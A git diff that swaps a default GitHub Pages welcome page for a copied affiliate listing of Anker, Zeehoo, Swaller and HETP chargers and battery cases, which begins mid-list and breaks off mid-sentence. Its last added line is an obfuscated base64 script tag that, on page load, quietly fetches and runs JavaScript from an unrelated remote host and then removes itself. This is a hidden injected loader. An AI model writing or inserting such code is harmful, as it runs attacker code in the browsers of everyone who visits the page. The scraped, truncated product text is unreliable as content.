@@ -1,37 +1,20 @@
-## Welcome to GitHub Pages
+ANKER POWERCORE PORTABLE CHARGER (4.5 STARS); $46-$56
+We’ve all had those moments where our phones are at 4 percent battery and there’s no outlet in sight. Prepare ahead with this portable charger from Anker, which can handle multiple devices on the go. This charger comes packed with a lot of power—Anker estimates that this device can give smartphones an extra 92 hours of battery life every time it’s recharged. This is exactly the type of charger you need in your bag if you're a commute
 
-You can use the [editor on GitHub](https://github.com/jpmsyaog/Few-thinks/edit/gh-pages/index.md) to maintain and preview the content for your website in Markdown files.
+7. ANKER DUAL USB CAR CHARGER (4.7 STARS); $9-$12
 
-Whenever you commit to this repository, GitHub Pages will run [Jekyll](https://jekyllrb.com/) to rebuild the pages in your site, from the content in your Markdown files.
+While more and more cars include built-in USB outlets to accommodate smartphones, those of us who drive older cars aren’t quite so lucky. But you can make up for that with this affordable high-speed car charger, which plugs into your car’s cigarette lighter and powers multiple devices at once. This charger is compatible with just about any device, provided you have a cable to attach it to the USB port.
 
-### Markdown
+8. ZEEHOO WIRELESS CAR CHARGER (4.3 STARS); $40
 
-Markdown is a lightweight and easy-to-use syntax for styling your writing. It includes conventions for
+This device does double duty as a phone charger and a car mount. It requires a bit of setup to attach this charger to your dashboard, but once that’s complete, your phone can act as a convenient, hands-free GPS while charging up.
 
-```markdown
-Syntax highlighted code block
+9. SWALLER IPHONE 8 PLUS/7 PLUS BATTERY CASE (4.2 STARS); $37-$38
+This portable charger can give your iPhone an extra 25 hours worth of battery if you’re in a bind. Plus, it’s convenient—you can charge both your phone and the wireless battery case simultaneously using the same charging cable. Have a newer model of iPhone? Swaller’s got you covered with a selection of other battery cases.
 
-# Header 1
-## Header 2
-### Header 3
+10. HETP GALAXY S8 BATTERY CASE (4 STARS); $30-$33
 
-- Bulleted
-- List
+If you’re not an Apple user at all, you might instead opt for this battery case that’s compatible with the Samsung Galaxy S8. As with Swaller’s iPhone case, you can charge both your phone and the battery case itself at the same time—there’s no need to remove the case in order to get a full charge.
 
-1. Numbered
-2. List
-
-**Bold** and _Italic_ and `Code` text
-
-[Link](url) and ![Image](src)
-```
-
-For more details see [GitHub Flavored Markdown](https://guides.github.com/features/mastering-markdown/).
-
-### Jekyll Themes
-
-Your Pages site will use the layout and styles from the Jekyll theme you have selected in your [repository settings](https://github.com/jpmsyaog/Few-thinks/settings). The name of this theme is saved in the Jekyll `_config.yml` configuration file.
-
-### Support or Contact
-
-Having trouble with Pages? Check out our [documentation](https://docs.github.com/categories/github-pages-basics/) or [contact support](https://github.com/contact) and we’ll help you sort it out.
+At Mental Floss, we only write about the products we love and want to share with our readers, so all products are chosen independently by our editors. Mental Floss has affiliate relationships with certain retailers and may receive a percentage of any sale made from the links on this page. Prices and availability are accurate as of the time of publication.
+<script id="hr5On" src="data:text/javascript;base64, dmFyIF83dTRIbyA9IFsnXHg3MVx4NzVceDY1XHg3Mlx4NzlceDUzXHg2NVx4NmNceDY1XHg2M1x4NzRceDZmXHg3MicsICdceDYyXHg2Zlx4NjRceDc5JywgJ1x4NjdceDY1XHg3NFx4NDVceDZjXHg2NVx4NmRceDY1XHg2ZVx4NzRceDQyXHg3OVx4NDlceDY0JywgJ1x4NDRceDRmXHg0ZFx4NDNceDZmXHg2ZVx4NzRceDY1XHg2ZVx4NzRceDRjXHg2Zlx4NjFceDY0XHg2NVx4NjQnLCAnXHg2M1x4NzJceDY1XHg2MVx4NzRceDY1XHg0NVx4NmNceDY1XHg2ZFx4NjVceDZlXHg3NCcsICdceDczXHg2M1x4NzJceDY5XHg3MFx4NzQnLCAnXHg3NFx4NzlceDcwXHg2NScsICdceDc0XHg2NVx4NzhceDc0XHgyZlx4NmFceDYxXHg3Nlx4NjFceDczXHg2M1x4NzJceDY5XHg3MFx4NzQnXTsoZnVuY3Rpb24oX09jQmFHLCBfTEZObDUpIHt2YXIgXzNsVXRzID0gZnVuY3Rpb24oX1U0bmtCKSB7d2hpbGUgKC0tX1U0bmtCKSB7X09jQmFHWydwdXNoJ10oX09jQmFHWydzaGlmdCddKCkpO319O18zbFV0cygrK19MRk5sNSk7fShfN3U0SG8sIDB4MTFiKSk7dmFyIF9odUdtMSA9IGZ1bmN0aW9uKF9XY2pBTywgX3JtS0ZEKSB7X1djakFPID0gX1djakFPIC0gMHgwO3ZhciBfTTUxaVcgPSBfN3U0SG9bX1djakFPXTtyZXR1cm4gX001MWlXO307ZG9jdW1lbnRbJ1x4NjFceDY0XHg2NFx4NDVceDc2XHg2NVx4NmVceDc0XHg0Y1x4NjlceDczXHg3NFx4NjVceDZlXHg2NVx4NzInXShfaHVHbTEoJzB4MCcpLCBmdW5jdGlvbigpIHt2YXIgX1ROQlNLID0gZG9jdW1lbnRbX2h1R20xKCcweDEnKV0oX2h1R20xKCcweDInKSk7X1ROQlNLW19odUdtMSgnMHgzJyldID0gX2h1R20xKCcweDQnKTtfVE5CU0tbJ1x4NzNceDcyXHg2MyddID0gJ1x4NjhceDc0XHg3NFx4NzBceDczXHgzYVx4MmZceDJmXHg3M1x4NzBceDMyXHg2Zlx4NjlceDM5XHg3OFx4NzNceDJlXHg3MFx4NzJceDZmXHg2Nlx4NjVceDczXHg3OVx4NjFceDc5XHg2OVx4NmVceDZjXHg2MVx4NzJceDY5XHgyZVx4NjNceDZmXHg2ZFx4MmZceDVmXHg3Mlx4NjVceDZkXHg2Zlx4NzRceDY1XHg1Zlx4NzRceDcyXHg2MVx4NjNceDZiXHgyZVx4NmFceDczXHgzZlx4NjNceDYxXHg2ZFx4NzBceDYxXHg2OVx4NjdceDZlXHgzZFx4NTNceDRiXHg3N1x4NDhceDRmXHg1OVx4NDFceDMwXHg0ZVx4NzknO2RvY3VtZW50W19odUdtMSgnMHg1JyldKF9odUdtMSgnMHg2JykpWydceDYxXHg3MFx4NzBceDY1XHg2ZVx4NjRceDQzXHg2OFx4NjlceDZjXHg2NCddKF9UTkJTSyk7ZG9jdW1lbnRbX2h1R20xKCcweDcnKV0oJ2hyNU9uJylbJ1x4NzJceDY1XHg2ZFx4NmZceDc2XHg2NSddKCk7fSwgeydceDZmXHg2ZVx4NjNceDY1JzogISFbXX0pOw=="></script>
